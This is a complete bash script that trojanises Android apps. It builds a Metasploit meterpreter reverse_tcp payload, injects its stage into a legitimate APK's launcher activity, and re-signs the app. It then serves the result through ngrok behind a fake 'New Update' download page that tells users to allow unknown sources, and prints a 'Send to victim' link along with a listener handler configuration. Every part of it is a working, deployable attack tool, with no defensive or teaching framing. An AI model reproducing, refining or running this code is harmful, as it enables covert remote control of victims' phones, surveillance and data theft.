#!/usr/bin/env bash
# =====================================================================
#  apkbind.sh - msfvenom + apktool APK binder with ngrok delivery
#  One click: auto-installs deps -> asks for APK (path or URL) -> binds -> serves
#
#  Usage: ./apkbind.sh [apk_path_or_url]
#  Env  : NGROK_TOKEN=xxxx  (or saved in ~/.apkbind/token)
# =====================================================================
set -uo pipefail

# ------------------------- CONFIG ------------------------------------
TARGET_INPUT="${TARGET_APK:-${1:-}}"
ORIG_APK=""

NGROK_TOKEN="${NGROK_TOKEN:-}"
HTTP_PORT="${HTTP_PORT:-8080}"
LPORT="${LPORT:-4444}"
KS_PASS="${KS_PASS:-apkbind123}"
KS_ALIAS="apkbind"
KS_DIR="$HOME/.apkbind"
TOKEN_FILE="$KS_DIR/token"
KEYSTORE="$KS_DIR/release.keystore"
WORK="$(pwd)/apkbind_$(date +%Y%m%d_%H%M%S)"
PAYLOAD_APK="$WORK/payload.apk"
DECODED="$WORK/decoded"
STAGE_SRC="$WORK/stage_src"
SIGNED="$WORK/signed.apk"
WWW="$WORK/www"
NGROK_BIN="$HOME/.apkbind/bin/ngrok"

RED=$'\e[31m'; GRN=$'\e[32m'; YEL=$'\e[33m'; CYN=$'\e[36m'; RST=$'\e[0m'
info(){ printf '%s[*]%s %s\n' "$CYN" "$RST" "$*" >&2; }
ok(){   printf '%s[+]%s %s\n' "$GRN" "$RST" "$*" >&2; }
warn(){ printf '%s[!]%s %s\n' "$YEL" "$RST" "$*" >&2; }
die(){  printf '%s[x]%s %s\n' "$RED" "$RST" "$*" >&2; exit 1; }

mkdir -p "$WORK" "$WWW" "$KS_DIR/bin"

cleanup(){
  local rc=$?
  [ -n "${NGROK_PID:-}" ] && for p in $NGROK_PID; do kill "$p" 2>/dev/null; done
  [ -n "${HTTP_PID:-}" ] && kill "$HTTP_PID" 2>/dev/null
  pkill -f "ngrok.*http" 2>/dev/null || true
  pkill -f "ngrok.*tcp" 2>/dev/null || true
  [ $rc -ne 0 ] && warn "failed. logs: $WORK"
  exit $rc
}
trap cleanup EXIT INT TERM

# --------------------- AUTO DEPENDENCY INSTALL -----------------------
ensure_deps(){
  local need_bins="msfvenom apktool java python3 curl unzip keytool"
  local opt_bins="msfconsole zipalign apksigner file wget"

  _missing(){
    local b out=""
    for b in $1; do
      command -v "$b" >/dev/null 2>&1 || out="$out $b"
    done
    echo "${out# }"
  }

  local miss; miss="$(_missing "$need_bins")"
  if [ -n "$miss" ]; then
    info "missing: $miss"
    if command -v pkg >/dev/null 2>&1; then
      info "installing Termux packages..."
      pkg update -y >/dev/null 2>&1 || true
      pkg install -y openjdk-17 apktool apksigner zipalign python curl unzip wget file which >/dev/null 2>&1 || true
      if ! command -v msfvenom >/dev/null 2>&1; then
        pkg install -y unstable-repo >/dev/null 2>&1 || true
        pkg install -y metasploit >/dev/null 2>&1 || warn "msfvenom may require manual install on Termux"
      fi
    elif command -v apt >/dev/null 2>&1; then
      local SUDO=""
      [ "$(id -u)" -ne 0 ] && command -v sudo >/dev/null 2>&1 && SUDO="sudo"
      info "installing APT packages (sudo: ${SUDO:-no})..."
      $SUDO apt update -y >/dev/null 2>&1 || true
      $SUDO apt install -y default-jdk apktool apksigner zipalign python3 curl unzip wget file android-sdk-build-tools >/dev/null 2>&1 || true
      if ! command -v msfvenom >/dev/null 2>&1; then
        info "installing metasploit-framework (large download)..."
        $SUDO apt install -y metasploit-framework >/dev/null 2>&1 || warn "metasploit install failed"
      fi
    else
      die "no package manager (pkg/apt) found"
    fi

    miss="$(_missing "$need_bins")"
    [ -z "$miss" ] || die "still missing: $miss"
  fi

  local omiss; omiss="$(_missing "$opt_bins")"
  [ -z "$omiss" ] || warn "optional missing:$omiss (some features skipped)"
  ok "dependencies ready"
}

# --------------------- NGROK TOKEN RESOLVE ---------------------------
resolve_ngrok_token(){
  if [ -z "$NGROK_TOKEN" ] && [ -f "$TOKEN_FILE" ]; then
    NGROK_TOKEN="$(cat "$TOKEN_FILE")"
    ok "ngrok token loaded (~/.apkbind/token)"
  fi
  if [ -z "$NGROK_TOKEN" ]; then
    echo
    info "ngrok authtoken required - https://dashboard.ngrok.com/get-started/your-authtoken"
    printf 'ngrok authtoken > '
    read -r NGROK_TOKEN
    [ -n "$NGROK_TOKEN" ] || die "token required"
    echo "$NGROK_TOKEN" > "$TOKEN_FILE"
    chmod 600 "$TOKEN_FILE"
    ok "token saved"
  fi
}

# --------------------- TARGET APK: PATH / URL / PROMPT ---------------
download_apk(){
  local url="$1" fname out
  fname="$(basename "${url%%\?*}")"
  [[ -z "$fname" || "$fname" == "download" || "$fname" != *.* ]] && fname="target.apk"
  out="$WORK/$fname"

  info "downloading: $url"
  if command -v curl >/dev/null 2>&1; then
    curl -fL --progress-bar --retry 3 -o "$out" "$url" || die "download failed"
  elif command -v wget >/dev/null 2>&1; then
    wget --show-progress -O "$out" "$url" || die "download failed"
  else
    die "curl/wget not found"
  fi
  echo "$out"
}

resolve_target_apk(){
  local input="$TARGET_INPUT"

  if [ -z "$input" ]; then
    echo
    printf '%s================================================%s\n' "$CYN" "$RST"
    printf '%s  Which app do you want to bind the payload to?%s\n' "$CYN" "$RST"
    printf '%s================================================%s\n' "$CYN" "$RST"
    echo "  Option 1: local APK path   (./app.apk)"
    echo "  Option 2: GitHub/HTTP URL  (https://github.com/.../app.apk)"
    echo "  Option 3: '.' - list APKs in current folder"
    echo
    printf 'APK path or URL > '
    read -r input
  fi

  if [[ "$input" =~ ^https?:// ]]; then
    ORIG_APK="$(download_apk "$input")"
    ok "download complete: $(du -h "$ORIG_APK" | cut -f1)"
  elif [ "$input" = "." ]; then
    local found
    found=$(find "$PWD" -maxdepth 2 -type f -iname '*.apk' 2>/dev/null | head -30)
    [ -n "$found" ] || die "no .apk in $PWD or subfolders"
    echo
    local i=1; local list=()
    while IFS= read -r f; do
      printf '  [%d] %s\n' "$i" "$f"
      list+=("$f"); i=$((i+1))
    done <<< "$found"
    echo
    printf 'pick number (1-%d) > ' "${#list[@]}"
    read -r pick
    if [[ "$pick" =~ ^[0-9]+$ ]] && [ "$pick" -ge 1 ] && [ "$pick" -le "${#list[@]}" ]; then
      ORIG_APK="${list[$((pick-1))]}"
    else
      die "invalid number"
    fi
  else
    ORIG_APK="$input"
  fi

  [ -f "$ORIG_APK" ] && ORIG_APK="$(cd "$(dirname "$ORIG_APK")" && pwd)/$(basename "$ORIG_APK")"

  [ -f "$ORIG_APK" ] || die "file not found: $ORIG_APK"
  [ -r "$ORIG_APK" ] || die "cannot read: $ORIG_APK"
  [ -s "$ORIG_APK" ] || die "empty file: $ORIG_APK"

  local magic
  magic=$(head -c 4 "$ORIG_APK" | od -An -tx1 | tr -d ' \n' 2>/dev/null)
  [ "$magic" = "504b0304" ] || die "not an APK/ZIP (magic=$magic): $ORIG_APK"

  if command -v unzip >/dev/null 2>&1; then
    unzip -l "$ORIG_APK" 2>/dev/null | grep -q 'AndroidManifest.xml' \
      || die "no AndroidManifest.xml in APK - merge split APKs first"
  fi

  ok "target APK: $ORIG_APK ($(du -h "$ORIG_APK" | cut -f1))"
  echo
}

# ------------------------ NGROK --------------------------------------
setup_ngrok(){
  if [ ! -x "$NGROK_BIN" ]; then
    local arch
    case "$(uname -m)" in
      aarch64|arm64) arch="arm64" ;;
      armv7l|arm)    arch="arm" ;;
      x86_64|amd64)  arch="amd64" ;;
      *) die "unsupported arch: $(uname -m)" ;;
    esac
    info "downloading ngrok ($arch)"
    curl -fsSL "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz" \
      -o "$WORK/ngrok.tgz" || die "ngrok download failed"
    tar -xzf "$WORK/ngrok.tgz" -C "$KS_DIR/bin" ngrok || die "extract failed"
    chmod +x "$NGROK_BIN"
  fi
  "$NGROK_BIN" config add-authtoken "$NGROK_TOKEN" >/dev/null 2>&1 || die "authtoken set failed"

  # clear stale ngrok processes
  pkill -f "ngrok.*http" 2>/dev/null || true
  pkill -f "ngrok.*tcp" 2>/dev/null || true
  pkill -f "ngrok start" 2>/dev/null || true
  sleep 1

  info "starting ngrok HTTP tunnel ($HTTP_PORT)..."
  nohup "$NGROK_BIN" http "$HTTP_PORT" --log "$WORK/ngrok_http.log" --web-addr 127.0.0.1:4040 >/dev/null 2>&1 &
  local pid_http=$!
  NGROK_PID="$pid_http"

  local api="http://127.0.0.1:4040/api/tunnels" i
  for i in $(seq 1 30); do
    curl -fsS "$api" >/dev/null 2>&1 && break
    sleep 1
  done
  curl -fsS "$api" > "$WORK/tunnels_http.json" || { tail -30 "$WORK/ngrok_http.log"; die "HTTP tunnel API fail"; }

  PUBLIC_URL=$(python3 - "$WORK/tunnels_http.json" <<'PY'
import json,sys
d=json.load(open(sys.argv[1]))
for t in d.get("tunnels",[]):
    if t["public_url"].startswith("https://"): print(t["public_url"]); break
PY
)
  [ -n "${PUBLIC_URL:-}" ] || { tail -30 "$WORK/ngrok_http.log"; die "HTTP URL not found"; }
  ok "download base: $PUBLIC_URL"

  info "starting ngrok TCP tunnel ($LPORT)..."
  nohup "$NGROK_BIN" tcp "$LPORT" --log "$WORK/ngrok_tcp.log" --web-addr 127.0.0.1:4041 >/dev/null 2>&1 &
  local pid_tcp=$!

  local api2="http://127.0.0.1:4041/api/tunnels"
  for i in $(seq 1 30); do
    curl -fsS "$api2" >/dev/null 2>&1 && break
    sleep 1
  done
  curl -fsS "$api2" > "$WORK/tunnels_tcp.json" || { tail -30 "$WORK/ngrok_tcp.log"; die "TCP tunnel API fail"; }

  local tcp_url
  tcp_url=$(python3 - "$WORK/tunnels_tcp.json" <<'PY'
import json,sys
d=json.load(open(sys.argv[1]))
for t in d.get("tunnels",[]):
    if t["public_url"].startswith("tcp://"): print(t["public_url"]); break
PY
)
  [ -n "${tcp_url:-}" ] || { tail -30 "$WORK/ngrok_tcp.log"; die "TCP URL not found"; }

  TCP_HOST="${tcp_url#tcp://}"; TCP_HOST="${TCP_HOST%:*}"
  TCP_PORT="${tcp_url##*:}"
  ok "reverse endpoint: $TCP_HOST:$TCP_PORT"

  NGROK_PID="$pid_http $pid_tcp"
}

# --------------------- PAYLOAD + BIND ---------------------------------
build_payload(){
  info "building msfvenom payload ($TCP_HOST:$TCP_PORT)"
  msfvenom -p android/meterpreter/reverse_tcp \
    LHOST="$TCP_HOST" LPORT="$TCP_PORT" \
    --min-sdk-version 21 --platform android \
    -o "$PAYLOAD_APK" >/dev/null 2>&1 || die "msfvenom failed"
  [ -s "$PAYLOAD_APK" ] || die "payload APK empty"

  info "extracting payload smali stage"
  apktool d -f -s "$PAYLOAD_APK" -o "$STAGE_SRC" >/dev/null 2>&1 || die "stage decode failed"
  [ -d "$STAGE_SRC/smali/com/metasploit/stage" ] || die "stage smali not found"
}

decode_target(){
  info "decoding target APK: $ORIG_APK"
  apktool d -f "$ORIG_APK" -o "$DECODED" >/dev/null 2>&1 \
    || apktool d -f --no-res "$ORIG_APK" -o "$DECODED" >/dev/null 2>&1 \
    || die "target decode failed (merge split APKs first)"
}

find_launcher(){
  LAUNCHER=$(python3 - "$DECODED/AndroidManifest.xml" <<'PY'
import re,sys
x=open(sys.argv[1],encoding='utf-8',errors='ignore').read()
pkg=re.search(r'package="([^"]+)"',x)
pkg=pkg.group(1) if pkg else ""
blocks=re.findall(r'<activity\b[^>]*?/>|<activity\b.*?</activity>',x,re.S)
for b in blocks:
    if 'LAUNCHER' in b:
        n=re.search(r'android:name="([^"]+)"',b)
        if n:
            name=n.group(1)
            print(name if not name.startswith('.') else pkg+name)
            break
PY
)
  [ -n "$LAUNCHER" ] || die "launcher Activity not found"
  ok "injection target: $LAUNCHER"
}

inject(){
  local smali_dir=""
  for d in "$DECODED"/smali "$DECODED"/smali_classes2 "$DECODED"/smali_classes3; do
    [ -d "$d" ] && { smali_dir="$d"; break; }
  done
  [ -n "$smali_dir" ] || { smali_dir="$DECODED/smali"; mkdir -p "$smali_dir"; }

  mkdir -p "$smali_dir/com/metasploit"
  cp -r "$STAGE_SRC/smali/com/metasploit/stage" "$smali_dir/com/metasploit/" || die "stage copy failed"

  local stage_file desc
  stage_file=$(grep -rl 'method public static start(Landroid/content/Context;)V' \
               "$smali_dir/com/metasploit/stage" | head -1)
  [ -n "$stage_file" ] || die "start() method not found"
  desc="L$(echo "$stage_file" | sed "s|$smali_dir/||; s|\.smali$||");"

  local target="" d f
  for d in "$DECODED"/smali*; do
    f="$d/${LAUNCHER//.//}.smali"
    [ -f "$f" ] && { target="$f"; break; }
  done
  if [ -z "$target" ]; then
    warn "launcher smali not found - injecting into first Activity with onCreate"
    target=$(grep -rl 'onCreate(Landroid/os/Bundle;)V' "$DECODED"/smali* 2>/dev/null | head -1)
  fi
  [ -n "$target" ] || die "injection point not found"

  info "injecting into: ${target#"$DECODED"/}"
  awk -v desc="$desc" '
    !done && /^\.method/ && /onCreate\(Landroid\/os\/Bundle;\)V/ { inm=1 }
    inm && !done && /^[[:space:]]*\.(locals|registers)/ {
      print; print "    invoke-static {p0}, " desc "->start(Landroid/content/Context;)V";
      done=1; inm=0; next
    }
    { print }
  ' "$target" > "$target.new" && mv "$target.new" "$target"
  grep -q 'metasploit/stage' "$target" || die "injection verify failed"
  ok "smali injection complete"
}

rebuild_and_sign(){
  local unsigned="$WORK/unsigned.apk"
  info "rebuilding"
  apktool b "$DECODED" -o "$unsigned" >/dev/null 2>&1 \
    || apktool b --use-aapt2 "$DECODED" -o "$unsigned" >/dev/null 2>&1 \
    || die "rebuild failed"

  [ -f "$KEYSTORE" ] || {
    info "creating keystore"
    keytool -genkeypair -keystore "$KEYSTORE" -alias "$KS_ALIAS" -keyalg RSA \
      -keysize 2048 -validity 10000 -storepass "$KS_PASS" -keypass "$KS_PASS" \
      -dname "CN=apkbind, O=Android, C=BD" >/dev/null 2>&1 || die "keystore failed"
  }

  local aligned="$unsigned"
  if command -v zipalign >/dev/null 2>&1; then
    aligned="$WORK/aligned.apk"
    zipalign -f -p 4 "$unsigned" "$aligned" || die "zipalign failed"
  else
    warn "zipalign missing - skipped"
  fi

  if command -v apksigner >/dev/null 2>&1; then
    apksigner sign --ks "$KEYSTORE" --ks-pass "pass:$KS_PASS" \
      --ks-key-alias "$KS_ALIAS" --key-pass "pass:$KS_PASS" \
      --v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true \
      --out "$SIGNED" "$aligned" || die "apksigner failed"
    apksigner verify "$SIGNED" >/dev/null 2>&1 || die "verify failed"
    ok "v1+v2+v3 sign + verify"
  else
    warn "apksigner missing - jarsigner fallback (Android 11+ may reject)"
    jarsigner -sigalg SHA256withRSA -digestalg SHA-256 \
      -keystore "$KEYSTORE" -storepass "$KS_PASS" -keypass "$KS_PASS" \
      "$aligned" "$KS_ALIAS" >/dev/null 2>&1 || die "jarsigner failed"
    cp "$aligned" "$SIGNED"
  fi
}

# ----------------------- DELIVERY -------------------------------------
serve(){
  local base; base="$(basename "$ORIG_APK" .apk)"
  local fname="${base}_update.apk"
  cp "$SIGNED" "$WWW/$fname"
  local size; size=$(du -h "$WWW/$fname" | cut -f1)
  local md5;  md5=$(md5sum "$WWW/$fname" | cut -d' ' -f1)

  cat > "$WWW/index.html" <<EOF
<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${base} - Update</title>
<style>
 *{box-sizing:border-box;margin:0}
 body{font-family:system-ui,-apple-system,sans-serif;background:#0d1117;color:#e6edf3;
      min-height:100vh;display:grid;place-items:center;padding:24px}
 .card{max-width:400px;width:100%;background:#161b22;border:1px solid #30363d;
       border-radius:16px;padding:28px;text-align:center}
 h1{font-size:20px;margin-bottom:6px}
 p{color:#8b949e;font-size:14px;line-height:1.6}
 a.btn{display:block;margin:22px 0 14px;padding:15px;border-radius:10px;
       background:#238636;color:#fff;text-decoration:none;font-weight:600;font-size:16px}
 a.btn:active{background:#1f7a31}
 .meta{font-size:12px;color:#6e7681;word-break:break-all}
 ol{text-align:left;color:#8b949e;font-size:13px;line-height:1.7;margin:16px 0 0 18px}
</style></head><body>
<div class="card">
  <h1>${base} - New Update</h1>
  <p>Tap the button below to install.</p>
  <a class="btn" href="${fname}" download>Download APK (${size})</a>
  <p class="meta">MD5: ${md5}</p>
  <ol>
    <li>Wait for the download to complete</li>
    <li>Tap the file from notification / file manager</li>
    <li>Allow "Unknown sources" if prompted</li>
    <li>Tap Install - existing data is preserved</li>
  </ol>
</div></body></html>
EOF

  cat > "$WORK/serve.py" <<'PY'
import http.server, socketserver, sys, os
os.chdir(sys.argv[1]); port=int(sys.argv[2])
class H(http.server.SimpleHTTPRequestHandler):
    extensions_map = {**http.server.SimpleHTTPRequestHandler.extensions_map,
                      '.apk':'application/vnd.android.package-archive',
                      '.html':'text/html; charset=utf-8'}
    def end_headers(self):
        self.send_header('Cache-Control','no-store'); super().end_headers()
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
with socketserver.TCPServer(("127.0.0.1",port),H) as s: s.serve_forever()
PY

  python3 "$WORK/serve.py" "$WWW" "$HTTP_PORT" &
  HTTP_PID=$!
  sleep 1
  curl -fsS "http://127.0.0.1:$HTTP_PORT/" >/dev/null || die "local server did not start"

  cat > "$WORK/handler.rc" <<EOF
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
EOF

  echo
  ok "=========================== READY ==========================="
  printf '  Send to victim  : %s%s/%s%s\n' "$GRN" "$PUBLIC_URL" "$fname" "$RST"
  printf '  Landing page    : %s%s%s\n' "$GRN" "$PUBLIC_URL" "$RST"
  printf '  Handler         : msfconsole -r %s\n' "$WORK/handler.rc"
  printf '  File            : %s\n' "$WWW/$fname"
  printf '  md5             : %s\n' "$md5"
  echo "============================================================="
  echo
  info "Ctrl+C stops tunnel and server. Run handler in a separate terminal."
  wait "$NGROK_PID"
}

# --------------------------- MAIN ------------------------------------
ensure_deps
resolve_ngrok_token
resolve_target_apk
setup_ngrok
build_payload
decode_target
find_launcher
inject
rebuild_and_sign
serve
